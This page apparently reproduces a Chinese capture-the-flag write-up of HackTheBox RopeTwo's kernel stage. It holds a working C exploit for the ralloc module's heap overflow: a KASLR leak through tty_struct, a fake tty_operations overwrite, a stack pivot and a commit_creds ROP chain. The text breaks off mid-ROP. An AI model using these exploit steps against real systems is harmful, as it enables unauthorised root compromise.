---
title: 内核接口、映射与权限原语
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/kernel/
categories:
- 二进制安全
- 内核安全
tags:
- 知识库
- Linux内核
- KASLR
- ROP
- CVE-2020-8831
- 端口敲门
- OverlayFS
- SUID
- UDF
- 引用计数
- UAF
description: 内核阶段需要把设备接口、用户态映射、内核指针和权限函数放在同一执行路径中。本章保留原环境的调试、结构体、堆布局与替代提权分支，便于逐步核对控制原语。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

内核阶段需要把设备接口、用户态映射、内核指针和权限函数放在同一执行路径中。本章保留原环境的调试、结构体、堆布局与替代提权分支，便于逐步核对控制原语。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/kernel/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

RopeTwo 的 ralloc 记录 IOCTL、tty_operations、KASLR、栈迁移与权限恢复。

Smasher2 从原生模块引用计数进入本地内核设备的映射分析。

Lord of the Root 保留 OverlayFS、SUID 与 UDF 多种路线，每条路线的前提不同。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [ralloc、tty_operations 与内核 ROP](#case-hackthebox-rope2-getroot) | hackthebox-rope2-getroot | Linux内核、KASLR、ROP、CVE-2020-8831 |
| [端口序列与多种本地提权](#case-lord-of-the-root-1-0-1) | Lord-Of-The-Root-1-0-1 | 端口敲门、OverlayFS、SUID、UDF |
| [引用计数与内核映射](#case-smasher2) | Smasher2 | 引用计数、UAF、Linux内核 |

<a id="case-hackthebox-rope2-getroot"></a>

## ralloc、tty_operations 与内核 ROP

分析从 IOCTL 结构和可控堆对象出发，串联 KASLR 泄漏、close 回调覆盖与栈迁移；另保留 apport 的非预期路径。

<p class="kb-provenance">来源 hackthebox-rope2-getroot · 原记录 2021-02-27 · 59 个代码块 · 4 处图片引用</p>

<details class="kb-evidence" id="record-hackthebox-rope2-getroot">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start hackthebox-rope2-getroot -->

#### 前言

此篇文章专门记录hack the box - ropetwo机器中获取root权限的ralloc KASLR linux内核堆ROP利用部分。

 - 到这一步之前，建议先看前两个步骤:
 - [HackTheBox-RopeTwo-[PWN-Chrome-V8引擎]](https://fdlucifer.github.io/2021/01/23/chrome-browserv8-pwn/)
 - [HackTheBox-RopeTwo-[pwn-rshell]](https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/)

本篇文章是hackthebox - ropetwo机器的最后一个部分, 进行内核调试漏洞利用。



#### 枚举

当在寻找从chromeuser升级到r4j的方法时，运行了一个find查询来查找r4j拥有的文件。在上面展示了对该用户拥有的文件的搜索，对r4j组拥有的文件的搜索还返回了一些有趣的东西:

``` bash
r4j@rope2:~$ find / -type f -group r4j -ls 2>/dev/null | grep -v -e " \/proc" -e " \/sys"
  1054414      8 -rw-r-----   1 root     r4j          5856 Jun  1  2020 /usr/lib/modules/5.0.0-38-generic/kernel/drivers/ralloc/ralloc.ko
  1056436     16 -rwsr-xr-x   1 r4j      r4j         14312 Feb 24  2020 /usr/bin/rshell
  1054405      4 -rwx------   1 r4j      r4j          3771 Apr  4  2019 /home/r4j/.bashrc
  1056441      4 -rw-r-----   1 root     r4j            33 Feb 26 17:52 /home/r4j/user.txt
  1054406      4 -rwx------   1 r4j      r4j           807 Apr  4  2019 /home/r4j/.profile
  1054407      4 -rwx------   1 r4j      r4j           220 Apr  4  2019 /home/r4j/.bash_logout
  1054423      0 -rw-r--r--   1 r4j      r4j             0 Feb 23  2020 /home/r4j/.cache/motd.legal-displayed
```

ralloc.ko是一个内核模块。在/dev中有一个匹配的设备:

``` bash
r4j@rope2:/dev$ ls -l ralloc
crw-r--r-- 1 root root 10, 52 Feb 26 17:52 ralloc
```

使用scp获取模块的副本:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/rope2]
└─# scp -i id_rsa r4j@10.10.10.196:/usr/lib/modules/5.0.0-38-generic/kernel/drivers/ralloc/ralloc.ko .
ralloc.ko                                                                                                          100% 5856    20.2KB/s   00:00    
┌──(root💀kali)-[~/hackthebox/machine/rope2]
└─# ls
chrome  gdb-rshell.init  id_rsa.pub            libc-2.29.so-debug                 libc.so.6-ropetwo  pwn_rshell.py  rshell    xpl.js
exp.py  id_rsa           ld-linux-x86-64.so.2  libc6-dbg_2.29-0ubuntu2_amd64.deb  patch.diff         ralloc.ko      xpl.html
```

还需要一些关于RopeTwo的额外信息，以便复制环境。操作系统和内核版本:

``` bash
r4j@rope2:~$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=19.04
DISTRIB_CODENAME=disco
DISTRIB_DESCRIPTION="Ubuntu 19.04"
r4j@rope2:~$ uname -a
Linux rope2 5.0.0-38-generic #41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

查看内核正在运行的保护，查看/proc/cpuinfo。对于每个处理器，都看到了flag smep，它代表[监督模式执行保护](https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention)。这意味着不能在内核中运行用户空间代码。相反，需要在漏洞开发利用过程中使用ROP来实现目标。

#### 本地配置

因为内核模块是特定于内核的，所以想在本地VM中创建相同的环境。要访问Linux主机，最简单的方法是使用QEMU。这篇[博文](https://www.nullbyte.cat/post/linux-kernel-exploit-development-environment/#environment-setup)详细介绍了这个过程，但是本篇文章使用ubuntu 19.04 vm虚拟机系统来调试。

#### 搭建VM

下载[Ubuntu 19.04的iso](http://old-releases.ubuntu.com/releases/disco/)，抓取了non-live的iso，并构建了一个新的VM。让它处于NAT模式，但添加了[端口转发](https://hitchhikingtheweb.wordpress.com/2014/09/02/portforwarding-with-vmware-player-and-nat/)，这样就可以SSH进入它, 也可以自己配置sshd来连接ssh。

安装好之后，虚拟机已经运行的内核:

``` bash
root@ubuntu:~# uname -a
Linux ubuntu 5.0.0-13-generic #41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

如果没有的话，它可以通过apt获得，所以可以使用sudo apt install linux-image-5.0.0-38-generic进行安装。

 - 注意这里更新源要使用old-release的源，否则安装内核不成功，其他方法安装内核容易报错。

还需要调试symbols包，从[这里](http://launchpadlibrarian.net/454028472/linux-image-unsigned-5.0.0-38-generic-dbgsym_5.0.0-38.41_amd64.ddeb)获取并安装(花了一些时间):

``` bash
root@ubuntu:~# dpkg -i linux-image-unsigned-5.0.0-38-generic-dbgsym_5.0.0-38.41_amd64.ddeb
Selecting previously unselected package linux-image-unsigned-5.0.0-38-generic-dbgsym.
(Reading database ... 171311 files and directories currently installed.)
Preparing to unpack linux-image-unsigned-5.0.0-38-generic-dbgsym_5.0.0-38.41_amd64.ddeb ...
Unpacking linux-image-unsigned-5.0.0-38-generic-dbgsym (5.0.0-38.41) ...
Setting up linux-image-unsigned-5.0.0-38-generic-dbgsym (5.0.0-38.41) ...
```

要做的最后一件事是进入这个虚拟机的.vmx文件并添加:

``` bash
debugStub.listen.guest64 = "TRUE"
```

这会在主机127.0.0.1:8864上启动一个监听器，可以将gdb连接到这个监听器上。如果需要从另一个主机连接，可以添加第二行:

``` bash
debugStub.listen.guest64.remote = "TRUE"
```

如果有这一行，监听器将在0.0.0.0:8864上。

如果因为某些原因想改变端口，这样做(但将只使用默认端口):

``` bash
debugStub.port.guest64 = "8865"
```

#### 安装ralloc

将通过SSH或使用VMWare Tools将模块复制到VM中，以便在VM中共享一个文件夹。要加载模块，可以简单地使用insmod(插入模块):

``` bash
test@ubuntu:~/rope2$ sudo insmod ./ralloc.ko
[sudo] password for test:
```

现在它显示在lsmod(列表模块)中，并且创建了设备:

``` bash
test@ubuntu:~/rope2$ lsmod | grep ralloc
ralloc                 16384  0
test@ubuntu:~/rope2$ ls /dev/ralloc
/dev/ralloc
```

可以通过在/proc/modules中grepping找到它在内存中的地址:

``` bash
test@ubuntu:~/rope2$ sudo cat /proc/modules | grep ralloc
ralloc 16384 0 - Live 0xffffffffc0605000 (OE)
```

#### gdb

从PowerShell导入一个wsl bash shell:

``` bash
PS C:\Users\Administrator> bash
test@DESKTOP-9LSPC40:/mnt/c/Users/Administrator$
```

按照页面上的说明在这个环境中安装[GEF](https://github.com/hugsy/gef)(尝试过[Peda](https://github.com/longld/peda)，但它与内核调试不太匹配)。

当运行gdb时，需要将它指向正在调试的内核。因为已经安装了调试symbols，所以可以把内核从/usr/lib/debug/boot中取出:

``` bash
/usr/lib/debug/boot/vmlinux-5.0.0-38-generic
```

现在将在内核文件上启动gdb，并将目标设置为remote:

``` bash
root@DESKTOP-9LSPC40:~/rope2# gdb -q ./vmlinux-5.0.0-38-generic
GEF for linux ready, type `gef' to start, `gef config' to configure
92 commands loaded for GDB 9.2 using Python engine 3.8
GEF for linux ready, type `gef' to start, `gef config' to configure
92 commands loaded for GDB 9.2 using Python engine 3.8
Reading symbols from ./vmlinux-5.0.0-38-generic...
gef➤  target remote:8864
Remote debugging using :8864
```

现在，要把ralloc文件添加到本地gdb实例中。这使gdb能够设置断点

``` bash
gef➤  add-symbol-file ralloc.ko 0xffffffffc0605000
add symbol table from file "ralloc.ko" at
        .text_addr = 0xffffffffc05fb000
Reading symbols from ralloc.ko...
(No debugging symbols found in ralloc.ko)
```

#### 静态分析

#### 通用结构

需要弄清楚这个模块做什么，所以将在Ghidra打开ralloc.ko。该模块导出了两个函数，rope2_init 和 rope2_exit:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot.jpg)

它们都非常简单，rope2_init调用misc_register, rope2_exit调用misc_dereregister来创建和删除设备。还有其他一些函数，但只有一个真正有趣，是rope2_ioctl。

#### IOCTL
#### 结构

这段代码有两个用于管理数据的结构体，所以花了一分钟阅读代码，看看这些结构是如何使用的，然后在Ghidra中创建它们。我第一个调用了ralloc_in，它被用来管理通过ioctl传递的数据被调用:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot1.jpg)

另一个命名为ralloc_array。这用于命名为buffers的全局变量，该变量最多可以容纳32 (0x20)个缓冲区。每个对象为缓冲区存储一个大小和一个地址:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot2.jpg)

#### rope2_ioctl

一旦将这些应用到代码中的变量上，就会得到非常清晰的结果。

``` bash
long rope2_ioctl(undefined8 fd,int ioctl_num)

{
  long addr;
  long user_input_;
  ulong id;
  long return;
  long in_GS_OFFSET;
  long user_input;
  ulong user_input.size;
  void *user_input.data;
  long _canary;
  long canary;
  void *__src;
  void *__dest;
  
  __fentry__();
  canary = *(long *)(in_GS_OFFSET + 0x28);
  mutex_lock(lock);
  _copy_from_user(&user_input,user_input_,0x18);
  if (ioctl_num == 0x1000) {
    if ((user_input.size < 0x401) && ((uint)user_input < 0x20)) {
      id = (ulong)(uint)user_input * 0x10;
      if (*(long *)(arr + id + 8) == 0) {
        addr = __kmalloc(user_input.size,0x6000c0);
        *(long *)(arr + id + 8) = addr;
        if (addr != 0) {
          *(ulong *)(arr + id) = user_input.size + 0x20;
          return = 0;
          goto LAB_00100104;
        }
      }
    }
  }
  else {
    if (ioctl_num == 0x1001) {
      if (((uint)user_input < 0x20) && (*(long *)(arr + (ulong)(uint)user_input * 0x10 + 8) != 0)) {
        kfree();
        *(undefined8 *)(arr + (ulong)(uint)user_input * 0x10 + 8) = 0;
        return = 0;
        goto LAB_00100104;
      }
    }
    else {
      if (ioctl_num == 0x1002) {
        if ((uint)user_input < 0x20) {
          if ((*(void **)(arr + (ulong)(uint)user_input * 0x10 + 8) != (void *)0x0) &&
             (__dest = *(void **)(arr + (ulong)(uint)user_input * 0x10 + 8), __src = user_input.data
             , (user_input.size & 0xffffffff) < *(ulong *)(arr + (ulong)(uint)user_input * 0x10) ||
               (user_input.size & 0xffffffff) == *(ulong *)(arr + (ulong)(uint)user_input * 0x10)))
          goto joined_r0x001001ec;
        }
      }
      else {
        if ((ioctl_num == 0x1003) && ((uint)user_input < 0x20)) {
          __src = *(void **)(arr + (ulong)(uint)user_input * 0x10 + 8);
          if ((__src != (void *)0x0) &&
             (__dest = user_input.data,
             (user_input.size & 0xffffffff) <= *(ulong *)(arr + (ulong)(uint)user_input * 0x10))) {
joined_r0x001001ec:
            if (((ulong)user_input.data & 0xffff000000000000) == 0) {
              memcpy(__dest,__src,user_input.size & 0xffffffff);
              return = 0;
              goto LAB_00100104;
            }
          }
        }
      }
    }
  }
  return = -1;
LAB_00100104:
  mutex_unlock(lock);
  if (canary == *(long *)(in_GS_OFFSET + 0x28)) {
    return return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

进一步优化后的代码：

``` bash
long rope2_ioctl(undefined8 fd,int ioctl_num,long input_struct)

{
  long _canary;
  void *__dest;
  void *__src;
  long addr;
  long user_input_;
  ulong id;
  long return;
  long in_GS_OFFSET;
  ralloc_in user_input;
  
  __fentry__();
  _canary = *(long *)(in_GS_OFFSET + 0x28);
  mutex_lock(lock);
  _copy_from_user(&user_input,user_input_,0x18);
                    /* ADD */
  if (ioctl_num == 0x1000) {
    id = (ulong)(uint)user_input.id;
    if ((user_input.size < 0x401) && ((uint)user_input.id < 0x20)) {
      if (buffers[id].address == 0) {
        addr = __kmalloc(user_input.size,0x6000c0);
        buffers[id].address = addr;
        if (addr != 0) {
          buffers[id].size = user_input.size + 0x20;
          return = 0;
        }
      }
    }
  }
  else {
                    /* Delete */
    if (ioctl_num == 0x1001) {
      if (((uint)user_input.id < 0x20) && (buffers[(uint)user_input.id].address != 0)) {
        kfree();
        buffers[(uint)user_input.id].address = 0;
        return = 0;
      }
    }
    else {
                    /* Write */
      if (ioctl_num == 0x1002) {
        if ((uint)user_input.id < 0x20) {
          if (((void *)buffers[(uint)user_input.id].address != (void *)0x0) &&
             (__dest = (void *)buffers[(uint)user_input.id].address, __src = user_input.data,
             (user_input.size & 0xffffffff) < buffers[(uint)user_input.id].size ||
             (user_input.size & 0xffffffff) == buffers[(uint)user_input.id].size))
          goto joined_r0x001001ec;
        }
      }
      else {
                    /* Read */
        if ((ioctl_num == 0x1003) && ((uint)user_input.id < 0x20)) {
          __src = (void *)buffers[(uint)user_input.id].address;
          if ((__src != (void *)0x0) &&
             (__dest = user_input.data,
             (user_input.size & 0xffffffff) <= buffers[(uint)user_input.id].size)) {
          }
        }
      }
      if (((ulong)user_input.data & 0xffff000000000000) == 0) {
        memcpy(__dest,__src,user_input.size & 0xffffffff);
        return = 0;
      } else {
        return = -1;
      }
    }
  }
  mutex_unlock(lock);
  if (_canary == *(long *)(in_GS_OFFSET + 0x28)) {
    return return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

基本上，在4个可能的输入代码上有一个switch语句来执行添加(0x1000)、删除(0x1001)、写入(0x1002)和读取(0x1003)。

漏洞在于如何添加新块。有一个检查来确保块不大于0x400，并且id小于32，然后将大小保存到比缓冲区大0x20字节的缓冲区列表中。这允许在缓冲区的末端之外进行读写操作。

#### 基本相互作用

开始写一个c程序，将与设备交互，包括一些帮助函数，以进行每个IOCTL调用:

``` bash
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>

int fd;

struct user_data_struct {
    uint64_t id;
    uint64_t size;
    void* data;
} user_data;


long create_buf(uint64_t id, uint64_t size){
    user_data.id = id;
    user_data.size = size;
    return ioctl(fd, 0x1000, &user_data);
}

long delete_buf(uint64_t id) {
    user_data.id = id;
    return ioctl(fd, 0x1001, &user_data);
}


long write_buf(uint64_t id, uint64_t size, void *data){
    user_data.id = id;
    user_data.size = size;
    user_data.data = data;
    return ioctl(fd, 0x1002, &user_data);
}


long read_buf(uint64_t id, uint64_t size, void *data){
    user_data.id = id;
    user_data.size = size;
    user_data.data = data;
    return ioctl(fd, 0x1003, &user_data);
}
```

现在，将从一个简单的main开始，它打开设备，清除缓冲区，创建一个缓冲区，向它写入0x40字节的As，然后从它读取0x420字节:

``` bash
int main(int argc) {
    fd = open("/dev/ralloc", O_RDONLY);
    if(fd == -1) {
        fprintf(stderr, "Failed to open /dev/ralloc");
        return -1;
    }

    for(int i=0; i < 0x20; i++){
        delete_buf(i);
    }

    create_buf(1, 0x400);

    uint64_t *input = malloc(0x400);
    memset(input, 0x41, 0x40);
    write_buf(1, 0x40, input);

    uint64_t *output = malloc(0x420);
    read_buf(1, 0x420, output);

    for(int i=0; i < 0x420/8; i++){
        if (i % 4 == 0) {
            printf("\n%03x: ", i*8);
        }
        printf("%016lx ", output[i]);
    }
    printf("\n");
}
```

当运行这个，得到的结果匹配所期望的:

``` bash
test@ropetest:~$ ./exploit

000: 4141414141414141 4141414141414141 4141414141414141 4141414141414141 <-- 0x40 bytes of A
020: 4141414141414141 4141414141414141 4141414141414141 4141414141414141 
040: 6c732f6c656e7265 61686769732f6261 65686361635f646e 2f70756f7267632f <-- random stuff in 0x400 byte buffer
060: 5f646e6168676973 3039286568636163 6f69737365733a35 732e343939312d6e 
080: 5553002965706f63 3d4d455453595342 530070756f726763 39383d4d554e5145 
0a0: 5f43455355003632 494c414954494e49 313631313d44455a 3339353439323531 
0c0: ffff9880f48c0000 dead000000000100 dead000000000200 dead000000000100 
0e0: dead000000000200 dead000000000100 dead000000000200 dead000000000100 
100: dead000000000200 dead000000000100 dead000000000200 dead000000000100 
120: dead000000000200 dead000000000100 dead000000000200 dead000000000100 
140: dead000000000200 dead000000000100 dead000000000200 dead000000000100 
160: dead000000000200 dead000000000100 dead000000000200 dead000000000100 
180: dead000000000200 dead000000000100 dead000000000200 ffff9880f48c7598 
1a0: ffff9880f48c7598 0000000000000000 0000000000000000 0000000000000000 
1c0: 0000000000000000 ffff9880f48c75c8 ffff9880f48c75c8 ffff9880f48c75d8 
1e0: ffff9880f48c75d8 ffff9880f48c75e8 ffff9880f48c75e8 0000000000000000 
200: 0000000000000000 0000000000000000 0000000000000000 ffff987fa5bf3800 
220: 0000000000000218 0000000000000000 0000000000000000 0000000000000000 
240: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
260: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
280: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
2a0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
2c0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
2e0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
300: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
320: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
340: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
360: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
380: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
3a0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
3c0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
3e0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
400: ffffffff960c4f20 ffffffff9655c3c0 ffffffff96067120 ffffffff96711080 <-- reading into next buffer
```

#### KASLR Defeat

#### 策略

利用内核堆的一种常用技术是找到tty_struct。可以稍后使用它来执行，但首先将使用它来泄漏一个地址，这个地址与内核基的常量偏移量相等。将使用/dev/ptmx创建它，这是一个[伪终端设备](https://linux.die.net/man/4/ptmx)。有很多文章展示了利用这一点的好例子，比如[这个](https://changochen.github.io/2018-02-07-sharif8.html)和[这个](https://hackmd.io/@ptr-yudai/rJp1TpbBU)。

其思想是，创建一个新的缓冲区，然后立即打开/dev/ptmx，它将为tty_struct分配一个0x2e0字节的内核缓冲区，希望紧接在缓冲区之后。因为可以读取0x20字节超出缓冲区的结束，希望将能够读取到结构，它有以下格式:

``` bash
struct tty_struct {
	int	magic;
	struct kref kref;
	struct device *dev;
	struct tty_driver *driver;
	const struct tty_operations *ops;
	/* ...... */
}
```

目标是读取tty_operations指针，因为它指向ptm_unix98_ops，它与内核基的偏移量是恒定的。第一个尝试是使用TTY_MAGIC[定义为](https://docs.huihoo.com/doxygen/linux/kernel/3.7/include_2linux_2tty_8h_source.html)0x5401这一事实来检查是否设法读取正确的结构体。但是，内存中有多个tty_struct，当查看调试器时，它会发现其他的tty_struct不指向ptm_unix98_ops。

可以在gdb中查看ptm_unix98_ops的当前地址:

``` bash
gef➤  p &ptm_unix98_ops
$1 = (const struct tty_operations *) 0xffffffff820af6a0
<ptm_unix98_ops>
```

虽然顶部的地址会随着KASLR而改变，但底部的三颗不会改变。因此，将寻找magic和最后三个字节，期望tty_operations。

要找到从ptm_unix98_ops到内核基的偏移量，将查看/proc/kallsyms。

``` bash
root@ropetest:~# cat /proc/kallsyms | grep ' startup_64'
ffffffff94a00000 T startup_64
```

所以偏移量是:

``` bash
gef➤  p 0xffffffff95aaf6a0 - 0xffffffff94a00000
$1 = 0x10af6a0
```

#### 实现

下面的代码将清除所有缓冲区槽。然后，它将尝试最多32次来分配缓冲区，然后立即打开/dev/ptmx.然后，它将执行越界读取，查找tty_operations的magic和正确的低三个字节。在找到它时，它将中断并打印:

``` bash
int main(int argc) {
    int i;
    fd = open("/dev/ralloc", O_RDONLY);
    if(fd == -1) {
        fprintf(stderr, "Failed to open /dev/ralloc");
        return -1;
    }

    for(i=0; i < 0x20; i++){
        delete_buf(i);
    }

    uint64_t *output = malloc(0x420);
    for(i=0; i < 0x20; i++){
        create_buf(i, 0x400);
        int ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);

        read_buf(1, 0x420, output);
        if((output[0x400/8] & 0xffffffff) == 0x5401 &&
           (output[0x418/8] & 0xfff) == 0x6a0) {
            break;
        }
        printf("[-]Failed to find tty_struct, retrying [%02x]\n", i);
    }

    if (i == 0x20){
        printf("Failed to find tty_struct. Try again\n");
        exit(-1);
    }
    for(i=0x400/8; i < 0x420/8; i++){
        printf("0x%03x: %016lx\n", i*8, output[i]);
    }
}
```

有时它什么也找不到，但很多时候它能找到:

``` bash
r4j@rope2:~$ /tmp/n
[-]Failed to find tty_struct, retrying [00]
[-]Failed to find tty_struct, retrying [01]
[-]Failed to find tty_struct, retrying [02]
0x400: 0000000100005401 <-- magic
0x408: 0000000000000000
0x410: ffff9880ead25600
0x418: ffffffff95aaf6a0 <-- tty_operations
```

现在把它重构成一个循环，这样它就会继续尝试，如果它达到32，仍然没有找到它:

``` bash
int main(int argc) {

    int i, id;
    uint64_t *output = malloc(0x420);
    uint64_t kernel_base;

    fd = open("/dev/ralloc", O_RDONLY);
    if(fd == -1) {
        fprintf(stderr, "Failed to open /dev/ralloc");
        return -1;
    }

    kernel_base = 0;
    while(kernel_base == 0) {
        // Clear buffers
        for(i=0; i < 0x20; i++){
            delete_buf(i);
        }

        // Loop over buffers, create, open ptmx, check for tty_struct
        for(i=0; i < 0x20; i++){
            create_buf(i, 0x400);
            ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);

            read_buf(i, 0x420, output);
            if((output[0x400/8] & 0xffffffff) == 0x5401 &&
               (output[0x418/8] & 0xfff) == 0x6a0) {
                break;
            }
            close(ptmx);
        }

        if (i == 0x20){
            printf("[-] Failed to find tty_struct. Try again.\n");
        } else {
            uint64_t ptm_unix98_ops = output[0x418/8];
            printf("[+] Identified ptm_unix98_ops address: %016lx\n", ptm_unix98_ops);
            kernel_base = ptm_unix98_ops - 0x10af6a0;
            printf("[+] Identified kernel base address:    %016lx\n", kernel_base);
            id = i;
        }
    }
}
```

有效:

``` bash
test@ropetest:~$ ./exploit
[-] Failed to find tty_struct. Try again.
[-] Failed to find tty_struct. Try again.
[+] Identified ptm_unix98_ops address: ffffffff95aaf6a0
[+] Identified kernel base address:    ffffffff94a00000
```

#### 控制RIP
#### 策略

既然能打败KASLR，就试着控制RIP。为了做到这一点，将继续滥用tty_struct，特别是用来获得泄漏的tty_operations结构体。这个结构体的[结构如下](https://github.com/torvalds/linux/blob/master/include/linux/tty_driver.h):

``` bash
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
...[snip]...
```

它包含了一堆指向函数的指针，这些函数将被用于各种操作。因此，当设备句柄上调用close时，close操作在这个结构体中查找。因此，如果能控制这个，就能控制RIP。

#### 实现

现在可以控制一个指向tty_operations结构体的指针。将创建一个新的，然后用自己的指针覆盖那个指针。要担心的唯一函数是close()，因为将在插入伪tty_operations之后立即关闭TTY的句柄。

``` bash
uint64_t *fake_tty_ops = malloc(248);
fake_tty_ops[4] = 0xdfdfdfdfdfdfdfdf;
output[0x418/8] = (uint64_t)fake_tty_ops;
write_buf(id, 0x420, output);
close(ptmx);
```

因为RIP现在是0xdfdfdfdfdfdfdfdf，所以会导致系统崩溃。

#### ROP
#### 堆栈中枢

控制了RIP，需要运行一些东西。当想到一个典型的ROP时，栈上有一个被覆盖的返回地址，然后ROP可以在此之后继续。在这种情况下，覆盖是tty_operations结构体中的一个指针，所以不能一直写在那里，因为那不是堆栈。这就引出了[堆栈枢轴](https://failingsilently.wordpress.com/2018/04/17/what-is-a-stack-pivot/)的概念，即使用一个gadget将堆栈移动到已经或将要写入rop链攻击的新地址。可以将堆栈移动到控制的内存空间，并在那里建立一个ROP链。

因为在寻找贯穿整个内核的gadgets，所以会有很多。将使用ROPGadget将它们全部转储到一个文件中(这将花费一分钟)，然后可以从那里搜索它。

``` bash
root@kali# python3 /opt/ROPgadget/ROPgadget.py --binary vmlinux-5.0.0-38-generic > gadgets 
root@kali# wc -l gadgets 
811057 gadgets
```

可以在崩溃中看到对close()的覆盖在RIP和RAX中结束。因此，虽然很难在堆栈上得到一些东西，以弹出到RSP，一个xchg RSP, rax将把堆栈在一个知道的地址。而且由于代码在内核中运行，在更改权限和覆盖内容方面有相当大的灵活性。

使用grep寻找xchg与RSP和RAX没有找到任何东西。

``` bash
root@kali# grep -E -e 'xchg rsp, rax ; ret' -e 'xchg rax, rsp ; ret' gadgets
```

但是因为可以预测单词的前32位，EAX和ESP也可以，还有很多这样的单词:

``` bash
root@kali# grep -E -e ': xchg esp, eax ; ret' -e ': xchg eax, esp ; ret' gadgets | wc -l
228
```

因为将使它成为堆栈指针，所以需要gadgets的地址位于8位边界上。还很多:

``` bash
root@kali# grep -E -e ': xchg esp, eax ; ret' -e ': xchg eax, esp ; ret' gadgets | grep -E "^0x[0-9a-f]{15}[08]" | wc -l
38
root@kali# grep -E -e ': xchg esp, eax ; ret' -e ': xchg eax, esp ; ret' gadgets | grep -E "^0x[0-9a-f]{15}[08]" | head
0xffffffff81368c08 : xchg eax, esp ; ret 0
0xffffffff817fccd8 : xchg eax, esp ; ret 0x166
0xffffffff81610650 : xchg eax, esp ; ret 0x2241
0xffffffff81076088 : xchg eax, esp ; ret 0x35e9
0xffffffff81288d78 : xchg eax, esp ; ret 0x3948
0xffffffff8114bb88 : xchg eax, esp ; ret 0x394d
0xffffffff812f74c0 : xchg eax, esp ; ret 0x3d
0xffffffff828deb28 : xchg eax, esp ; ret 0x43
0xffffffff814afc90 : xchg eax, esp ; ret 0x69e9
0xffffffff8154b090 : xchg eax, esp ; ret 0x8148
```

将获取第一个，现在代码看起来像:

``` bash
// Stack Pivot
size_t xchg_esp_eax = 0x368c08 + kernel_base;
uint64_t *fake_tty_ops = malloc(248);
fake_tty_ops[4] = xchg_esp_eax;
output[0x83] = (uint64_t)fake_tty_ops;
write_buf(id, 0x420, output);
uint64_t new_stack = xchg_esp_eax & 0xffffffff;

// Set Permissions

// Offsets

// ROP

// trigger ROP
close(ptmx);
```

带有32位参数的xchg指令将0清除64位寄存器的其余部分。因此，新的堆栈不会在xchg指令的顶部，而是在相同的位置，但前32位为空。

#### 权限

在内核中，有很多控制权，但是内存需要同时是可写的和可执行的，所以将调用mmap。调用需要在页面边界上，因此将最后三个小块设置为0，并选择一个足够大的大小，以便ROP不担心空间问题。[文档](https://man7.org/linux/man-pages/man2/mmap.2.html)在这里显示了标记，将选择MAP_PRIVATE，因为希望这个更改只影响这个进程，MAP_ANONYMOUS，因为在这里使用shellcode, MAP_FIXED，因为希望强制地址。对于MAP_ANONYMOUS, fd参数应该是-1，并且没有偏移量:

``` bash
// Set Permissions
mmap((void *)(new_stack & 0xfffff000), 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
    MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);

// Offsets

// ROP

// trigger ROP
close(ptmx);
```

#### ROP

ROP本身将使用一种技术，将prepare_kernel_cred(0)传递给commit_creds，以将当前进程设置为root。然后返回到用户空间，使用swapgs生成shell，并使用shell生成函数。

将定义需要使用的偏移量(未显示)，然后转到ROP。首先，将返回(使用ret gadget开始ROP总是好的)，然后调用prepare_kernel_cred(0):

``` bash
// ROP
uint64_t *st_ptr = new_stack;
int st_idx = 0;
st_ptr[st_idx++] = ret;
st_ptr[st_idx++] = pop_rdi;
st_ptr[st_idx++] = 0;
st_ptr[st_idx++] = prepare_kernel_cred;
```

返回时，结果将以RAX的形式出现，需要一种方法将其导入RDI。mov rdi, rdx gadget并不漂亮:

``` bash
